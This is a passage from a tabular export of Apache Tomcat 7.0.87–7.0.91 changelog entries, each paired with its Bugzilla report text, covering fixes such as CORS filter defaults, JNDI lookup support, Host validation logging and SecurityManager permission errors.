According to where you look into Tomcat 8+ documentation, at first sight it seems to be contradictory, because of the fact that old pool implementation still coexists with the new one, but if it's not clear for you, you don't know what to believe...

Well, a table clearly identifying all the modifications about this concern between Tomcat versions, would have been very useful.

But, before that, there's at least one mistake to fix, here https://tomcat.apache.org/tomcat-8.0-doc/jndi-resources-howto.html#JDBC_Data_Sources (and onward versions)
because, according to DBCP documentation and Tomcat upgrade guides, removeAbandoned attribute has become removeAbandonedOnBorrow / removeAbandonedOnMAintenance. 

Thank you"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62652
Web applications|Tomcat 7.0.91 (violetagg)|add|62666|Expand internationalisation support in the Manager application to include the server status page and provide Russian translations in addition to English. Patch provided by Artem Chebykin. (markt)|More tomcat localization for ServerStatus page|"Created attachment 36125 [details]
patch for tomcat 9

Hello, 
I would like  to suggest a patch for tomcat 9 for more localization of theServerStatus web-page. I changed filesStatusTransformer and StatusManagerServlet, so now you can internationalize part of ServerStatus web-page like you can ilocalize ManagerApp, HostManager and ServerStatus(some part) web-pages. I mean that part of ServerStatus that was written only in HTML, now you can internationalize it. At the moment I've updated  localization for English and Russian languages"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62666
Web applications|Tomcat 7.0.91 (violetagg)|fix|62676|Expand the CORS filter documentation to make it clear that explicit configuration is required to enable support for cross-origin requests. (markt)|Documentation of CORS Filter is now misleading|"This is partially a re-report of 62455, but with a more current version reported.

The documentation says that the minimal configuration of the CORS Filter is:

<filter>
  <filter-name>CorsFilter</filter-name>
  <filter-class>org.apache.catalina.filters.CorsFilter</filter-class>
</filter>
<filter-mapping>
  <filter-name>CorsFilter</filter-name>
  <url-pattern>/*</url-pattern>
</filter-mapping>

This was true when the default for cors.allowed.origins was * (e.g. https://web.archive.org/web/20180213064017/https://tomcat.apache.org/tomcat-8.0-doc/config/filter.html#CORS_Filter), but in the .53 release, it was changed to empty string per bug 62343.

The documentation should be updated with either a comment that the minimal configuration doesn't allow any access (so, what's the point?) or with the equivalent new configuration:

<filter>
  <filter-name>CorsFilter</filter-name>
  <filter-class>org.apache.catalina.filters.CorsFilter</filter-class>
  <init-param>
    <param-name>cors.allowed.origins</param-name>
    <param-value>*</param-value>
  </init-param>
</filter>
<filter-mapping>
  <filter-name>CorsFilter</filter-name>
  <url-pattern>/*</url-pattern>
</filter-mapping>"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62676
Tribes|Tomcat 7.0.91 (violetagg)|fix||Ensures that the specified rxBufSize is correctly set to receiver buffer size. (kfujino)|||
Other|Tomcat 7.0.91 (violetagg)|fix||Fixed spelling. Patch provided by Jimmy Casey via GitHub. (violetagg)|||
Other|Tomcat 7.0.91 (violetagg)|fix||Correct various spelling errors throughout the source code and documentation. Patch provided by Kazuhiro Sera. (markt)|||
Catalina|Tomcat 7.0.90 (violetagg)|fix|62498|Correct a regression in the fix for CVE-2017-12617 that caused request failures for some requests when using the VirtualDirContext. (markt)|FileDirContext validate not working properly for directories|"Created attachment 35993 [details]
Patch

We encounter weird errors with our webapp since tomcat 7.0.82

A change in org.apache.naming.resources.FileDirContext from Mark Thomas at 28.09.17 at 13:54
introduced the wrong behaviour due to difference in how constructors of java.io.File work.

e.g.:
File f = new File(""/tmp/"");

is not the same as:
File fp = new File(""/tmp"");
File f = new File(f, ""/"");


Thus, the changed check in the validate-method can result in absPath = ""/"" and canPath = """" ...and the check for equals fails, although its the same path!

I attached a patch to reverse the handling of absPath and canPath."|https://bz.apache.org/bugzilla/show_bug.cgi?id=62498
Catalina|Tomcat 7.0.90 (violetagg)|fix||Delete reference to removed class that prevented Tomcat from starting when running under a security manager. (markt)|||
Catalina|Tomcat 7.0.89 (violetagg)|fix||JNDI resources that are defined with injection targets but no value are now treated as if the resource is not defined. (markt)|||
Catalina|Tomcat 7.0.89 (violetagg)|fix||Ensure that JNDI names used for <lookup-name> entries in web.xml and for lookup elements of @Resource annotations specify a name with an explicit java: namespace. (markt)|||
Catalina|Tomcat 7.0.89 (violetagg)|add|51953|Add the RemoteCIDRFilter and RemoteCIDRValve that can be used to allow/deny requests based on IPv4 and/or IPv6 client address where the IP ranges are defined using CIDR notation. Based on a patch by Francis Galiegue. (markt)|Proposal: netmask filtering valve and filter [PATCH]|"This patch series (three) is a first implementation of a netmask filtering, pretty much as Apache's ""allow from"" and ""deny from"" directives, but with some limitations.

I submit these patches for review only for now. I have tested them with a main() and torturing the NetMask class with various corner cases and it survived all of it.

The issue I have right now is writing a unit test. I cannot figure out how to do it atm, pointers to example code would be welcome."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51953
Catalina|Tomcat 7.0.89 (violetagg)|fix|62343|Make CORS filter defaults more secure. This is the fix for CVE-2018-8014. (markt)|CORS security: reflecting any origin header value when configured to * is dangerous|"What's the Problem?
When CORS policy is configured to ""Origin:*"" and ""Credentials:true""(default setting), current Tomcat CORS filter will actively convert it to reflect any Origin header value. This kind of behavior is dangerous and has caused many security problems in the past[1-5].

Why is that?
Current CORS standards(both W3C CORS and WHATWG fetch standard) have a clear definition for the wildcard '*', which means any domain is allowed. But they also have another important security requirement: ""Origin: *"" and ""Credentials: true"" cannot be used at the same time, to avoid overly loose permissions. Currently all browsers follow this requirement to disallow this configuration combination.

If a framework actively converts '*' to reflect any origin header value, it means ""Origin: *"" and ""Credentials: true"" can be used at the same time. This behavior leads to CORS protocol's security design to be bypassed, causing many misconfiguration security problems.

How to fix?
Therefore, I suggest frameworks to follow the standard definition of *. When a user configures ""Origin:*"", frameworks just directly returns ""Access-control-Allow-Access: *"". When a user configures both ""Origin:*"" and ""Credentials: true"" , frameworks should warn users that this is a misconfiguration, instead of return any origin header value.


Some similar security issues:
[1] https://github.com/cyu/rack-cors/issues/126
[2] https://nodesecurity.io/advisories/148
[3] https://github.com/yiisoft/yii2/issues/16193

Some related blog posts:
[4] http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html
[5] https://ejj.io/misconfigured-cors/"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62343
Catalina|Tomcat 7.0.89 (violetagg)|fix||Make all loggers associated with Tomcat provided Filters non-static to ensure that log messages are not lost when a web application is reloaded. (markt)|||
Catalina|Tomcat 7.0.89 (violetagg)|fix||Correct the manifest for the annotations-api.jar. The JAR implements the Common Annotations API 1.1 and the manifest should reflect that. (markt)|||
Catalina|Tomcat 7.0.89 (violetagg)|fix||Switch to non-static loggers where there is a possibility of a logger becoming associated with a web application class loader causing log messages to be lost if the web application is stopped. (markt)|||
Catalina|Tomcat 7.0.89 (violetagg)|add|62389|Add the IPv6 loopback address to the default internalProxies regular expression. Patch by Craig Andrews. (markt)|Add ipv6 loopback address to the default internalProxies|0:0:0:0:0:0:0:1 is the IPv6 loopback address. It should be added to the default internalProxies regex.|https://bz.apache.org/bugzilla/show_bug.cgi?id=62389
Catalina|Tomcat 7.0.89 (violetagg)|fix||In the RemoteIpValve and RemoteIpFilter, correctly handle the case when the request passes through one or more trustedProxies but no internalProxies. Based on a patch by zhanhb. (markt)|||
Catalina|Tomcat 7.0.89 (violetagg)|fix||Correct the logic in MBeanFactory.removeConnector() to ensure that the correct Connector is removed when there are multiple Connectors using different addresses but the same port. (markt)|||
Catalina|Tomcat 7.0.89 (violetagg)|fix||Make JAASRealm mis-configuration more obvious by requiring the authenticated Subject to include at least one Principal of a type specified by userClassNames. (markt)|||
Catalina|Tomcat 7.0.89 (violetagg)|fix|62476|Use GMT timezone for the value of Expires header as required by HTTP specification (RFC 7231, 7234). (kkolinko)|Expires header shall use GMT timezone|"This issue was originally reported in a pull request 
https://github.com/apache/tomcat/pull/115

I am confirming the issue and stating it here for a more clear description.

Steps to reproduce:
1. Start Tomcat
2. Open a Browser and configure it to inspect network traffic (e.g. open ""Network"" tab in Developer's tools in Firefox)
3. Navigate to
http://localhost:8080/examples/jsp/security/protected/index.jsp

ACTUAL BEHAVIOR, Tomcat 9:
The following response headers are sent by the server:
[[[
HTTP/1.1 200 
Cache-Control: private
Expires: Thu, 01 Jan 1970 03:00:00 MSK
Set-Cookie: JSESSIONID=1D318BE83811595C4AAB11B7859D613B; Path=/examples; HttpOnly
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 650
Date: Wed, 20 Jun 2018 13:04:40 GMT
]]]

EXPECTED BEHAVIOR:
The ""Expires"" header should be in GMT, like the ""Date"" header already is.

SPECIFICATION:
https://tools.ietf.org/html/rfc7234#section-5.3
https://tools.ietf.org/html/rfc7231#section-7.1.1.1

The chapter 7.1.1.1 defines ""IMF-fixdate"" production with literal string of ""GMT"". Obsolete date time formats there (""obs-date"") do not cover this case either: they are for rfc850 and asctime dates.

> GMT          = %x47.4D.54 ; ""GMT"", case-sensitive



This issue is reproducible with Tomcat 9.
It is reproducible with Tomcat 7.0.88 as well."|https://bz.apache.org/bugzilla/show_bug.cgi?id=62476
Coyote|Tomcat 7.0.89 (violetagg)|fix||Log an error message if the AJP connector detects the the reverse proxy is sending AJP messages that are too large for the configured packetSize. (markt)|||
Coyote|Tomcat 7.0.89 (violetagg)|fix|62371|Improve logging of Host validation failures. (markt)|Improve logging in AbstractProcessor.parseHost()|"It now sends 400 code without any traces in logs of what is the source of the problem. In my case it was quite hard to trace the issue. I had:

java.lang.IllegalArgumentException: The character [_] is never valid in a domain name.
        at org.apache.tomcat.util.http.parser.HttpParser$DomainParseState.next(HttpParser.java:781)
        at org.apache.tomcat.util.http.parser.HttpParser.readHostDomainName(HttpParser.java:673)
        at org.apache.tomcat.util.http.parser.Host.parse(Host.java:66)
        at org.apache.tomcat.util.http.parser.Host.parse(Host.java:40)
        at org.apache.coyote.AbstractProcessor.parseHost(AbstractProcessor.java:269)
        at org.apache.coyote.http11.Http11Processor.prepareRequest(Http11Processor.java:760)
        at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:383)
        at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)
        at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:754)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1376)
        at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
        at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1135)
        at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:635)
        at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
        at java.base/java.lang.Thread.run(Thread.java:844)


I spend lots of time trying to debug the issue I had.


If you need more info on config - I have:

Apache 2.4 -> ProxyPass ajp -> tomcat (java 10)
           -> ProxyPass websocket (http11) -> tomcat (same)

All this runs as docker containers so in Apache config I connect to tomcat using name ""default_tomcat_1"" - given by docker (compose). As a result after upgrading from tomcat 7.0.56 to 9.0.7 I have all websocket requests just failing with code 400. After debugging tomcat I understand that websocket requests go via Http11Processor and fail cause it receives this ""default_tomcat_1"" as host name from Apache. At the same time other requests routed via AJP are working fine cause they've got Apache public IP as ""host"".

    On apache config:

    ProxyPass /websocket ws://default_tomcat_1:8080/websocket retry=0
    ProxyPassReverse /websocket ws://default_tomcat_1:8080/websocket

    ProxyPass / ajp://default_tomcat_1:8009/ retry=0
    ProxyPassReverse / ajp://default_tomcat_1:8009/"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62371
Coyote|Tomcat 7.0.89 (violetagg)|fix||Correctly handle a digest authorization header when the user name contains an escaped character. (markt)|||
Coyote|Tomcat 7.0.89 (violetagg)|fix||Correctly handle a digest authorization header when one of the hex field values ends the header with in an invalid character. (markt)|||
Jasper|Tomcat 7.0.89 (violetagg)|fix||Update web.xml, web-fragment.xml and web.xml extracts generated by JspC to use the Servlet 3.0 version of the relevant schemas. (markt)|||
Jasper|Tomcat 7.0.89 (violetagg)|fix||Improve IPv6 validation by ensuring that IPv4-Mapped IPv6 addresses do not contain leading zeros in the IPv4 part. Based on a patch by Katya Stoycheva. (markt)|||
Jasper|Tomcat 7.0.89 (violetagg)|fix|62080|Ensure that all reads of the current thread's context class loader made by the UEL API and implementation are performed via a PrivilegedAction to ensure that a SecurityException is not triggered when running under a SecurityManager. (mark)|EL Util class should have doPrivileged block|"The javax.el.Util class can lead to an AccessControlException in the getExpressionFactory() method is security is enabled.

I believe the call to get the classloader:

ClassLoader tccl = Thread.currentThread().getContextClassLoader();

should be wrapped in a doPrivileged block:


ClassLoader tccl;
        if (System.getSecurityManager() != null) {
            tccl = AccessController.doPrivileged(new PrivilegedAction<ClassLoader>() {
                @Override
                public ClassLoader run() {
                    return Thread.currentThread().getContextClassLoader();
                }
            });
        } else {
            tccl = Thread.currentThread().getContextClassLoader();
        }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62080
WebSocket|Tomcat 7.0.89 (violetagg)|fix||When decoding of path parameter failed, make sure to throw DecodeException instead of throwing ArrayIndexOutOfBoundsException. (kfujino)|||
WebSocket|Tomcat 7.0.89 (violetagg)|fix||Enable host name verification when using TLS with the WebSocket client. (markt)|||
jdbc-pool|Tomcat 7.0.89 (violetagg)|fix||When logValidationErrors is set to true, the connection validation error is logged as SEVERE instead of WARNING. (kfujino)|||
Other|Tomcat 7.0.89 (violetagg)|fix|62391|Remove references to javaw.exe as this file is not required by Tomcat and the references prevent the use of the Server JRE. (markt)|Unable to Install Windows Service with Server JRE|"When attempting to install Tomcat as a Windows service, bin/service.bat checks for the existence of java.exe and javaw.exe in the JRE's bin directory and fails if either does not exist.

java.exe exists on all of the Java distributions for Windows, but javaw.exe exists only on distributions that utilize GUI.

The Server JRE, which is the recommended distribution for server deployments does not include javaw.exe, and therefore the service installation from service.bat fails.

I checked with both Java 1.8u171 and Java 10.0.1:

$ ls -al server-jre\jdk1.8.0_171\bin\ | grep java
-rwxr-xr-x 1 Admin None  16808 Mar 28 17:15 java-rmi.exe
-rwxr-xr-x 1 Admin None 207784 Mar 28 17:15 java.exe
-rwxr-xr-x 1 Admin None  16808 Mar 28 17:15 javac.exe

$ ls -al server-jre\jdk-10.0.1\bin\ | grep java
-rwxr-xr-x 1 Admin None  150448 Mar 26 19:02 java.dll
-rwxr-xr-x 1 Admin None  232368 Mar 26 19:02 java.exe
-rwxr-xr-x 1 Admin None   17840 Mar 26 19:02 javac.exe
-rwxr-xr-x 1 Admin None  166320 Mar 26 19:02 javajpeg.dll

The fix is very easy.  The line

    if not exist ""%JRE_HOME%\bin\javaw.exe"" goto noJavaHome

at https://github.com/apache/tomcat/blob/trunk/bin/service.bat#L55 should be removed."|https://bz.apache.org/bugzilla/show_bug.cgi?id=62391
Other|Tomcat 7.0.89 (violetagg)|update||Update the packaged version of the Tomcat Native Library to 1.2.17 to pick up the latest Windows binaries built with APR 1.6.3 and OpenSSL 1.0.2o. (markt)|||
Other|Tomcat 7.0.89 (violetagg)|add||Implement checksum checks when downloading dependencies that are used to build Tomcat. (kkolinko)|||
Catalina|Tomcat 7.0.88 (violetagg)|fix||Treat the <mapped-name> element of a <env-entry> in web.xml in the same way as the mappedName element of the equivalent @Resource annotation. Both now attempt to set the mappedName property of the resource. (markt)|||
Catalina|Tomcat 7.0.88 (violetagg)|fix||Correct the processing of resources with <injection-target>s defined in web.xml. First look for a match using JavaBean property names and then, only if a match is not found, look for a match using fields. (markt)|||
Catalina|Tomcat 7.0.88 (violetagg)|fix||When restoring a saved request with a request body after FORM authentication, ensure that calls to the HttpServletRequest methods getRequestURI(), getQueryString() and getProtocol() are not corrupted by the processing of the saved request body. (markt)|||
Catalina|Tomcat 7.0.88 (violetagg)|fix||Fix startup failure when running under SecurityManager, a regression from the fix for bug 62273. (kkolinko)|Add support for alternate URL specification|"Browsers won't escape '{|}' in parameters area.
https://bugzilla.mozilla.org/show_bug.cgi?id=1451347
They state that they don't have to comply.

This link ""http://localhost:8090/jira/browse/SSP-15?jql=%20text%20=%20{ksi|delta}"" is completely legit for firefox and chrome.

Who should adjust?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62273
Catalina|Tomcat 7.0.88 (violetagg)|fix|62353|Correct a regression introduced in Tomcat 7.0.86. Restore the ability for Tomcat 7 to run on Java 6 where Common Annotations 1.0 is available. Document the requirement to use the Java endorsed mechanism to use Common Annotations 1.1. (markt)|7.0.87: java.lang.NoSuchMethodError: javax.annotation.Resource.lookup()Ljava/lang/String|"Created attachment 35912 [details]
TEST-org.apache.catalina.startup.TestContextConfig.APR.txt

Running unit tests for Tomcat 7.0.87 (release candidate) with Java 6.

The following tests unexpectedly fail:
TEST-org.apache.catalina.startup.TestContextConfig.APR.txt
TEST-org.apache.catalina.startup.TestContextConfig.BIO.txt
TEST-org.apache.catalina.startup.TestContextConfig.NIO.txt

See attached log file.

Tomcat fails to start in testBug54448and54450 test. Stacktrace:

[[[
Caused by: java.lang.NoSuchMethodError: javax.annotation.Resource.lookup()Ljava/lang/String;
	at org.apache.catalina.startup.WebAnnotationSet.addResource(WebAnnotationSet.java:339)
	at org.apache.catalina.startup.WebAnnotationSet.loadFieldsAnnotation(WebAnnotationSet.java:274)
	at org.apache.catalina.startup.WebAnnotationSet.loadApplicationServletAnnotations(WebAnnotationSet.java:135)
	at org.apache.catalina.startup.WebAnnotationSet.loadApplicationAnnotations(WebAnnotationSet.java:67)
	at org.apache.catalina.startup.ContextConfig.applicationAnnotationsConfig(ContextConfig.java:417)
	at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:881)
	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:388)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:117)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5566)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
]]]


This is regression from code added in r1827367."|https://bz.apache.org/bugzilla/show_bug.cgi?id=62353
Catalina|Tomcat 7.0.88 (violetagg)|code||Refactor the org.apache.naming package to reduce duplicate code. Duplicate code identified by the Simian tool. (markt)|||
Catalina|Tomcat 7.0.88 (violetagg)|fix|50019|Add support for <lookup-name>. Based on a patch by Gurkan Erdogdu. (markt)|"Adding JNDI ""lookup-name"" support In XML and Resource Annotations"|"Created attachment 26095 [details]
Patch that provides lookup functionality and resolves explained issue

1* Support for 

@Resource(""lookup"")
@EJB(lookup)
@WebServiceRef(""lookup"")

and via XML
....
<lookup-name>

2* Currently DefaultInstanceManager looks for <injection-target> element's <injection-target-class> name for getting injections from web.xml. But it must also look at class hierarchy. This patch also resolves this issue."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50019
Catalina|Tomcat 7.0.88 (violetagg)|fix|60490|Various formatting and layout improvements for the ErrorReportValve. Patch provided by Michael Osipov. (markt)|Several improvements to the ErrorReportValve|"Created attachment 34531 [details]
Patch for ErrorReportValve

Please find attached a patch (against 8.5.x trunk) for the current ErrorReportValve. It is a slightly modified version of my publically available EnhancedErrorReportValve.

What has been changed and why:
* Properties:
** Translate 'Type' to French and Spanish
** Apply proper case (upper case) for titles and labels according to Chicago Manual of Style
** Add stylistically correct en dash in English, semirraya/raya menor in Spanish and tiret demi-cadratin in French
** Remove all status codes below 400 because they aren't errors and can't be used with this valve anyway due to line 149/150
   (Cross-references aren't present to that bundle)
** Remove reference to org/apache/tomcat/util/http/res/LocalStrings.properties, this bundle does not exist any more
** Update all descriptions in English by the most recent versions of today's RFCs (through IANA listings/references)
** Split status codes to reasons and descriptions based on RFCs

* Java:
** Import TomcatCSS class for better readablity of the code
** Obtain reason and description from properties
** Align HTML code to HTML5 style
** Change head/title to status code and reason. The user (of a browser) does not care about the server running this webapp.
   Rather inform the user upfront that an HTTP error has happened and what its phrase is. More details are on the page itself.
** Have statusHeader contain only general information, details are layed out in the body
** Don't show in statusHeader message if showReport is false (applies to the issues above)
** Always include the CSS style because even if showReport is false, it still remains HTML and a few elements are displayed
** Use boolean getters rather than the fields directly
** Use translated label for 'Type'
** Don't abuse div as hr
** Don't use underline and bold, it is considered as bad style
** Omit the message line if there isn't any
** Don't print server info with rootCauseInLogs as it is confusing with the version and duplicates the information with the subsequent line
** Use System.lineSeparator() instead of \n

The goal is to clean up old strings, remove duplication and add consistency."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60490
Catalina|Tomcat 7.0.88 (violetagg)|fix||Relax Host validation by removing the requirement that the final component of a FQDN must be alphabetic. (markt)|||
Jasper|Tomcat 7.0.88 (violetagg)|add|50234|Add the capability to generate a web-fragment.xml file to JspC. (markt)|JspC use servlet 3.0 features|"Update JspC to allow new options to
1) Write web-fragment.xml as a valid web-fragment file.
2) Place all the precompiled jsp classes into a jar file
3) Put the web-fragment,xml (from step 1) into META-INF/web-fragment.xml of the jar file created in step 2"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50234
Jasper|Tomcat 7.0.88 (violetagg)|fix|62350|Refactor org.apache.jasper.runtime.BodyContentImpl so a SecurityException is not thrown when running under a SecurityManger and additional permissions are not required in the catalina.policy file. This is a follow-up to the fix for 43925. (kkolinko/markt)|"AccessControlException: ""org.apache.jasper.runtime.BodyContentImpl.BUFFER_SIZE"", ""read"""|"Smoke-testing Tomcat 8.5.31 + Java 8 + Security Manager.

All OK, but the following two pages fail with error 500:

http://localhost:8080/examples/jsp/jsp2/jspattribute/jspattribute.jsp
http://localhost:8080/examples/jsp/simpletag/foo.jsp

The first request fail with root cause

java.security.AccessControlException: access denied (""java.util.PropertyPermission"" ""org.apache.jasper.runtime.BodyContentImpl.BUFFER_SIZE"" ""read"")

The second request fails with

java.lang.NoClassDefFoundError: Could not initialize class org.apache.jasper.runtime.BodyContentImpl


Looking into the source code, o.a.j.r.BodyContentImpl.BUFFER_SIZE is a new system property, added in r1821364 - fix for bug 43925 - in Tomcat 8.5.27 onwards.


This issue is fixed by adding the following permission into conf/catalina.policy:

    permission java.util.PropertyPermission
     ""org.apache.jasper.runtime.BodyContentImpl.BUFFER_SIZE"", ""read"";

next to existing permission to read ""BodyContentImpl.LIMIT_BUFFER""."|https://bz.apache.org/bugzilla/show_bug.cgi?id=62350
Cluster|Tomcat 7.0.88 (violetagg)|fix||Remove duplicate calls when creating a replicated session to reduce the time taken to create the session and thereby reduce the chances of a subsequent session update message being ignored because the session does not yet exist. (markt)|||
Tribes|Tomcat 7.0.88 (violetagg)|fix||Ensure that the correct default value is returned when retrieve unset properties in McastService. (kfujino)|||
Other|Tomcat 7.0.88 (violetagg)|fix||Add a .gitattributes file to make sure that Git handles test data files for bug 52121 as binary. (kkolinko)|corrupt gzip output when compression=on in server.xml|"Created attachment 27886 [details]
Gzip Corruption Repro WAR

This appears to be same issue as posted by Christopher Taylor
Jun 30, 2011 at 8:05 am to Tomcat Users. The subject line has been preserved above.

As mentioned in the post, this seems to have arisen with this issue:
https://issues.apache.org/bugzilla/show_bug.cgi?id=48738

The change introduced this class: FlushableGZIPOutputStream. When we started using this, we noticed that certain string flush sequences would result in corrupt gzip output. 

The attached WAR provides a repro. The sequence of writes to the output stream that would‚Äôve been done by our server is mimicked in this case using a file system. There are 40 files each representing a flush. URL:

""http://localhost:8080/TomcatBugReportWAR""

I‚Äôve allowed the ‚Äòstart‚Äô and ‚Äòend‚Äô request parameters to control to the starting and ending points. I‚Äôve also allowed an ‚Äòappend‚Äô request parameter dump anything to the outputstream.

The defaults are 0, 40, and ‚Äú‚Äù for start end and append respectively.

The following query string appears particularly interesting as it seems to be the smallest sequence that causes the corruption and the subsequent string that is appended after the output is the only thing that appears corrupted:

""http://localhost:8080/TomcatBugReportWAR?start=19&end=30&append=something‚Äù

It‚Äôs also possible to reproduce this using only the FlushableGZIPOutputStream without using Tomcat at all. See attached JAR."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52121
Catalina|Tomcat 7.0.87 (violetagg)|fix|62316|Correct a regression in some refactoring that broke the default factory for JDBC datasources. (markt)|JDBC resources fail, ClassNotFoundException: org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory|"(Filing a Bugzilla entry to better document the issue and document a workaround.)

Mailing list thread (2018-04-17):
""ClassNotFoundException: org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory starting in 7.0.86""
https://tomcat.markmail.org/thread/gg566guvffchbcez

This is a regression in Tomcat 7.0.86. This was fixed in revision r1829376.


Steps to reproduce:

1. Configure a <Resource> entry with a database connection, without specifying a factory attribute. See examples here:
http://tomcat.apache.org/tomcat-7.0-doc/jndi-datasource-examples-howto.html

2. If the <Resource> is configured in <GlobalNamingResources> element in server.xml, the following errors are visible in catalina.#date.log when Tomcat starts up:

20-Apr-2018 03:11:24.196 WARNING [main] org.apache.catalina.core.NamingContextListener.addResource Failed to register in JMX: javax.naming.NamingException: Could not create resource factory instance [Root exception is java.lang.ClassNotFoundException: org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory]
20-Apr-2018 03:11:24.212 WARNING [main] org.apache.catalina.core.NamingContextListener.addResource Failed to register in JMX: javax.naming.NamingException: Could not create resource factory instance [Root exception is java.lang.ClassNotFoundException: org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory]
20-Apr-2018 03:11:24.290 SEVERE [main] org.apache.catalina.mbeans.GlobalResourcesLifecycleListener.createMBeans Exception processing Global JNDI Resources
 javax.naming.NamingException: Could not create resource factory instance [Root exception is java.lang.ClassNotFoundException: org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory]
	at org.apache.naming.factory.ResourceFactory.getObjectInstance(ResourceFactory.java:119)
	at javax.naming.spi.NamingManager.getObjectInstance(Unknown Source)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:848)
	at org.apache.naming.NamingContext.lookup(NamingContext.java:159)
	at org.apache.naming.NamingContextBindingsEnumeration.nextElementInternal(NamingContextBindingsEnumeration.java:117)
	at org.apache.naming.NamingContextBindingsEnumeration.next(NamingContextBindingsEnumeration.java:71)
	at org.apache.naming.NamingContextBindingsEnumeration.next(NamingContextBindingsEnumeration.java:34)
	at org.apache.catalina.mbeans.GlobalResourcesLifecycleListener.createMBeans(GlobalResourcesLifecycleListener.java:138)
	at org.apache.catalina.mbeans.GlobalResourcesLifecycleListener.createMBeans(GlobalResourcesLifecycleListener.java:145)
	at org.apache.catalina.mbeans.GlobalResourcesLifecycleListener.createMBeans(GlobalResourcesLifecycleListener.java:110)
	at org.apache.catalina.mbeans.GlobalResourcesLifecycleListener.lifecycleEvent(GlobalResourcesLifecycleListener.java:82)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:117)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
	at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:388)
	at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:333)
	at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:751)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
	at org.apache.catalina.startup.Catalina.start(Catalina.java:705)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
	at java.lang.reflect.Method.invoke(Unknown Source)
	at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:294)
	at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:428)
Caused by: java.lang.ClassNotFoundException: org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory
	at java.net.URLClassLoader.findClass(Unknown Source)
	at java.lang.ClassLoader.loadClass(Unknown Source)
	at java.lang.ClassLoader.loadClass(Unknown Source)
	at java.lang.Class.forName0(Native Method)
	at java.lang.Class.forName(Unknown Source)
	at org.apache.naming.factory.ResourceFactory.getObjectInstance(ResourceFactory.java:115)
	... 23 more"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62316
Catalina|Tomcat 7.0.87 (violetagg)|fix||Fix a rare edge case that is unlikely to occur in real usage. This edge case meant that writing long streams of UTF-8 characters to the HTTP response that consisted almost entirely of surrogate pairs could result in one surrogate pair being dropped. (markt)|||
Catalina|Tomcat 7.0.87 (violetagg)|fix||"Register MBean when DataSource Resource type=""javax.sql.XADataSource"". Patch provided by Masafumi Miura. (csutherl)"|||
Catalina|Tomcat 7.0.87 (violetagg)|add||Update the internal fork of Apache Commons BCEL to r1829827 to add early access Java 11 support to the annotation scanning code. (markt)|||
Catalina|Tomcat 7.0.87 (violetagg)|fix|62297|Enable the CrawlerSessionManagerValve to correctly handle bots that crawl multiple hosts and/or web applications when the Valve is configured on a Host or an Engine. (fschumacher)|Add support for multiple hosts/contexts in CrawlerSessionManagerValve|"Created attachment 35867 [details]
Support multiple hosts in one CrawlerSessionManagerValve

When the Crawler valve is set up for multiple hosts like in
 
 <Engine>
  <Host name=""localhost"" ... />
  <Host name=""example.invalid"" ... />
  <Valve className=""org.apache.catalina.valves.CrawlerSessionManagerValve"" />
 </Engine>

it is only managing the sessions for ""localhost"" as it is using the client ip as the only key.

See https://lists.apache.org/thread.html/3eb73d69855586717fa29ec5527ca4efdf64b4465425bc8c38c8ff83@%3Cusers.tomcat.apache.org%3E for more information"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62297
Catalina|Tomcat 7.0.87 (violetagg)|add||Collapse multiple leading / characters to a single / in the return value of HttpServletRequest#getContextPath() to avoid issues if the value is used with HttpServletResponse#sendRedirect(). This behaviour is enabled by default and configurable via the new Context attribute allowMultipleLeadingForwardSlashInPath. (markt)|||
Catalina|Tomcat 7.0.87 (violetagg)|fix||Improve handing of overflow in the UTF-8 decoder with supplementary characters. (markt)|||
